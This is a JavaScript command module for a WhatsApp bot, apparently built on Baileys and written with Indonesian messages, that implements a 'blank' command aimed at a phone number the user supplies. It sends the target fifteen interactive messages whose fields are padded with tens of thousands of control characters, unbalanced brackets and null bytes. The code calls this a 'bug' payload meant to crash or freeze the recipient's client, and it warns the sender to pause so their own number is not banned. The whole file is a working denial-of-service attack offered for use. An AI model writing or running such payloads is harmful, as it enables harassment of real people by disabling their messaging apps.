let handler = async (m, { conn, text, usedPrefix, command, RaplyGwe }) => {
    if (!text) return RaplyGwe(`Format salah.\n\n*Penggunaan:*\n${usedPrefix + command} 628xxxx`);
    
    const target = text.replace(/[^0-9]/g, '');
    
    if (target.length < 10 || target.length > 15) {
        return RaplyGwe(`❌ Nomor tidak valid. Pastikan menggunakan kode negara (contoh: 628xxx).`);
    }

    const targetJid = `${target}@s.whatsapp.net`;

    await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    try {
        for (let i = 0; i < 15; i++) {
            await conn.relayMessage(targetJid, {
                interactiveMessage: {
                    header: {
                        title: "\u000F".repeat(50000),
                        subtitle: "\u000F".repeat(50000),
                        bloksWidget: {
                            uuid: "\u000F".repeat(50000),
                            data: "[".repeat(50001),
                            type: "\u000F".repeat(50000),
                            fallback: "\u000F".repeat(50000)
                        }
                    },
                    body: {
                        text: "x"
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "single_select",
                            buttonParamsJson: `{"title":"${"\0".repeat(10000)}","sections":[{"title":"x","rows":[]}]}`
                        }]
                    }
                }
            }, { 
                noSelfSync: true 
            });
            
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
        if (RaplyGwe) {
            await RaplyGwe(`✅ *𝖲𝗎𝖼𝖼𝖾𝗌𝖾𝖽 𝖲𝖾𝗇𝖽 𝖡𝗎𝗀𝗌!*\n𝖲𝗎𝖼𝖼𝖾𝗌𝖾𝖽 𝖲𝖾𝗇𝖽 𝖯𝖺𝗒𝗅𝗈𝖺𝖽 𝖳𝗈 𝗍𝖺𝗋𝗀𝖾𝗍:\n\`${target}\`\n> ⁉️ Setelah bugs terkirim harap jeda agar nomer tidak ter benned`);
        }

    } catch (error) {
        console.error(error);
        
        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        
        if (RaplyGwe) {
            await RaplyGwe(`❌ *Gagal Terkirim:*\n\`${error.message}\``);
        }
    }
}

handler.command = /^(blank)$/i;
handler.tags = ['bugs'];
handler.help = ['blank <nomor>'];

export default handler
